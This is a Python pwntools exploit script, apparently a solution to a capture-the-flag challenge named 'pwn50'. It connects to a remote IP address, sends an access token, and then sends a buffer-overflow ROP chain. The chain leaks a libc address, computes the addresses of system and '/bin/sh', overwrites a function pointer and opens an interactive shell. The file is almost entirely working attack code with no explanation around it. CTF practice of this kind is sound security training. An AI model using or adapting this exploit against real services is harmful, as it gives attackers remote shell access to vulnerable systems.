#!/usr/bin/env python
# coding: utf-8

from pwn import *
#init
context.log_level = "debug"
local=False
name = "pwn50"
if local:
    p = process(name)
else:
    p = remote("115.28.78.54", 13455)
def sd(cont):
	p.sendline(cont)
def cv(cont):
	return p.recvuntil(cont)
#binary = ELF(name)
#print '[*] PID:',pidof(name)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
cv("token: ")
sd("f9e6d5eb63096fa65c8c275302580f2aNtrEBUug")
cv("WelCome my friend,Do you know password?\n")
gadget = 0x4007ba
stop_gad = 0x400715
gadret = 0x4007a0
printf = 0x601018
target = 0x601028
target2 = 0x601080
offset_system = 0x0000000000045390
offset_read = 0x00000000000f6670
offset_write = 0x00000000000f66d0
offset_str_bin_sh = 0x18c177


payload = 'a'*72 + p64(gadget)
payload += p64(0) + p64(1) + p64(printf) + p64(0x0) + p64(0x0) + p64(target)
payload += p64(gadret)
payload += p64(0xdeadbeefdeadbeef) + p64(0) + p64(1) + p64(target) + p64(0x10) + p64(target2) + p64(0x0)
payload += p64(gadret)
payload += p64(0xdeadbeefdeadbeef) + p64(0) + p64(1) + p64(target2) + p64(0x0) + p64(0x0) + p64(target2 + 8)
payload += p64(gadret)
p.send(payload)
sleep(0.5)


data = p.recvn(6) + '\x00\x00'
read_addr = u64(data)
print "read_addr: ",hex(read_addr)
libc_addr = read_addr - offset_read
system_addr = libc_addr + offset_system
binsh_addr = libc_addr + offset_str_bin_sh
payload2 = p64(system_addr) + '/bin/sh\x00\x00'
assert('\n' not in payload2)


p.send(payload2)
p.interactive()
